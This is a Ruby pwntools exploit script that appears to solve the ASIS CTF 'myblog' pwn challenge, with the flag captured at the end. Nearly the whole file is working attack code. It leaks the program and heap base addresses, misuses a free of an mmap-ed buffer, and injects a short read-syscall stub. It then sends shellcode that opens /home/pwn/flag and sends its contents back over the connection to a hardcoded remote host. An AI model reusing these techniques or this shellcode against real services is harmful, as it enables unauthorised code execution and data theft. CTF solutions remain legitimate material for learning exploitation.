#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '159.65.125.233', 31337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'myblog'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

# The mmap-ed address
rand_buf = `./rnd`.to_i
log.dump rand_buf.hex

def cmd(id)
  z.gets "Exit\n"
  z.write id.to_s.ljust(16, "\x00")
end

def create(content = 'A' * 47, author = 'B' * 7)
  cmd(1)
  z.gets "Input"; z.write content
  z.gets "Input"; z.write author
end

def fast_create(content = 'A' * 47, author = 'B' * 7)
  z.write 1.to_s.ljust(16, "\x00")
  z.write content
  z.write author
end

0x41.times { fast_create }
0x41.times { z.gets "Exit" }

def change(t)
  cmd(3)
  z.gets 'Owner : '
  z.write t.ljust(7, "\x00")
end

def free(id)
  cmd(2)
  z.gets 'index'
  z.puts id
end

cmd(31337)
z.gets '0x'
z.puts 'A' # do nothing
elf_base = z.gets.to_i(16) - 0xef4
h.offset(elf_base)
change(p64(elf_base + 0x202040)[0, 6])

free(-1) # free rand_buf
create('A' * 8 + p64(rand_buf + 8))
# leak heap
cmd(3)
z.gets 'Old Owner : '
heap = (z.recvn(6) + "\x00\x00").u64 - 0x260

# 7-byte read(0, 'rbp', 'rdx') shellcode!
z.write asm("xchg eax, ebx; xor edi, edi; push rbp; pop rsi; syscall")
h.offset(heap)

cmd(31337)
z.gets '0x'
z.write 'A' * 8 + (rand_buf + 0xf).p64 + p64(rand_buf + 8)

z.write asm(
  shellcraft.pushstr('/home/pwn/flag') +
  shellcraft.syscall('SYS_openat', -100, 'rsp', 0, 0) +
  shellcraft.syscall('SYS_sendfile', 1, 'rax', 0, 2147483647) +
  shellcraft.exit(0)
)

z.interact

# ubuntu 17.10
# ASIS{526eb5559eea12d1e965fe497b4abb0a308f2086}
